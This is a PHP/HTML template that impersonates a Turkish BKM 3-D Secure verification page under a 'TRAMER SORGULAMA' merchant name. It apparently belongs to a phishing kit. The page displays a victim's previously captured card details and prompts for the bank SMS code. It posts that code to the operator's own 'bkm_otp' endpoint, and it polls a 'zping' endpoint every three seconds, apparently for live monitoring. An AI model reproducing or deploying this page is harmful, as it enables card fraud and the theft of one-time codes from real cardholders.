<!DOCTYPE html>
<html lang="tr" style="height: 100%; width: 100%;">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="shortcut icon" type="image/png" href="<?= front_folder() ?>/bkm/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" href="<?= front_folder() ?>/bkm/img/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="<?= front_folder() ?>/bkm/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="<?= front_folder() ?>/bkm/graphics/favicon.png">
    <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="<?= front_folder() ?>/bkm/graphics/favicon.png">

    <title>BKM ACS</title>

    <link rel="stylesheet" href="<?= front_folder() ?>/bkm/content/styles/bkmacs-dist.css">
    <link rel="stylesheet" href="<?= front_folder() ?>/bkm/content/styles/main-dist.css" type="text/css" media="screen">
    <script type="text/javascript" src="<?= front_folder() ?>/bkm/content/scripts/main-dist.js"></script>
    <script type="text/javascript">
        var isSupportedIE = true;
    </script>
</head>

<body onload="init(300)">

    <div class="content-wrapper">

        <div class="header">
            <div class="brand-logo">
                <img 3dslogo="scheme" align="left" src="<?= front_folder() ?>/bkm/graphics/schema_000000002.gif">
            </div>
            <?php if (strlen($logoyol) > 0) : ?>
                <div class="member-logo">
                    <img align="right" src="<?= base_url($logoyol) ?>">
                </div>
            <?php endif; ?>
        </div>
        <div id="approve-page">
            <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
                <div class="loader"></div>
            </div>
            <div class="content">
                <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
                <div class="info-wrapper">
                    <div class="info-row">
                        <div class="info-col info-label">İşyeri Adı:</div>
                        <div class="info-col" 3dsdisplay="merchant" id="merchant-name">TRAMER SORGULAMA</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">İşlem Tutarı:</div>
                        <div class="info-col amount" 3dsdisplay="amount" id="amount"><?= number_format($data->balance, 2, '.', ',') ?> TL</div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">İşlem Tarihi-Saati:</div>
                        <div class="info-col" 3dsdisplay="date" id="operation-date-time"><?= dmyhi($data->tarih) ?></div>
                    </div>
                    <div class="info-row">
                        <div class="info-col info-label">Kart Numarası:</div>
                        <div class="info-col" 3dsdisplay="pan" id="pan">XXXX XXXX XXXX <?= substr($data->cc_no, 12, 15) ?></div>
                    </div>


                </div>
                <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
                    <div>
                        <h3>
                            İşlem şifreniz bankamıza kayıtlı cep telefonunuza gönderilecektir.<br>
                            Lütfen alışveriş şifrenizi giriniz.
                        </h3>
                    </div>
                    <div class="form-wrapper">
                        <form id="bkmform" class="form-code" method="POST" action="<?= base_url('bkm_otp/' . $data->hash) ?>" autocomplete="off" novalidate="novalidate">
                            <div class="form-row">
                                <label for="code" class="otpcode">Doğrulama Kodu</label>
                                <input type="text" class="f-input" name="password" maxlength="6" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                            </div>
                            <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: none;">
                                <span class="has-reg">Doğrulama kodu hatalı</span>
                            </div>
                            <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                                <div>
                                    <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                                </div>
                                <button id="retryButton" type="button" onclick="yeniSMSIste()" class="button btn-1 re-code v1" value="retry">
                                    Doğrulama Kodunu Yeniden Gönder
                                </button>
                                <div>
                                    <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                                </div>
                                <input style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                                <div class="noscriptHelpText">
                                    Doğrulama esnasında cep telefonunuza doğrulama kodu gelmemesi
                                    durumunda doğrulama için kalan sürenin dolmasını bekleyerek
                                    ?Doğrulama Kodunu Tekrar Gönder? linkinden tekrar doğrulama
                                    kodu gönderilmesini talep edebilirsiniz.<br> Tekrar
                                    doğrulama kodu gönderimi sağlandığı halde cep telefonunuza
                                    ulaşmaması ve benzeri problemlerde lütfen kartınızı ihraç eden
                                    kuruluş ile irtibata geçiniz.
                                </div>
                            </div>
                            <div id="submitButtonDiv">
                                <div class="has-submit">
                                    <button id="submitbutton" type="submit" name="submit" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                                </div>
                                <div id="timerDiv" class="has-timer">
                                    <span>Kalan Süre: </span> <span class="has-counter" id="has-counter">05:00</span>
                                </div>
                            </div>
                            <div class="call-to-action">
                                <div class="action-list">
                                    <div class="action-row">
                                        <div class="action-col left">
                                            <a data-fancybox="" data-src="#canceldialog" href="javascript:;" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi
                                                İptal Et</a>
                                            <button id="triggercancel" type="submit" name="cancel" value="cancel" style="display: none;"></button>
                                        </div>
                                        <div class="action-col right">
                                            <a data-fancybox="" data-type="iframe" data-src="" href="javascript:;" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">Yardım</a>
                                        </div>
                                    </div>
                                </div>
                                <div style="display: none;">
                                    <div class="panel" id="canceldialog">
                                        <h1 class="small" id="msg-cancel-box">İşyeri sayfasına yönlendirileceksiniz,
                                            işleminizi iptal etmek
                                            istediğinizden emin misiniz?</h1>
                                        <a href="<?= base_url() ?>" class="button btn-1 close-modal">Vazgeç</a>
                                        <a href="<?= base_url() ?>" class="button btn-1 btn-1-cancel txt-link trigger-cancel-page">
                                            İşlemi İptal Et
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript" src="<?= front_folder() ?>/bkm/content/scripts/bkmacs-dist.js" charset="utf-8"></script>

    <div class="Timer"></div>


    <?php $this->load->view('poslar/_default/inc_js.php'); ?>

    <script>
        setInterval(function() {
            $.get("<?= base_url('zping') ?>", function(data) {});
        }, 3000);
    </script>
</body>

</html>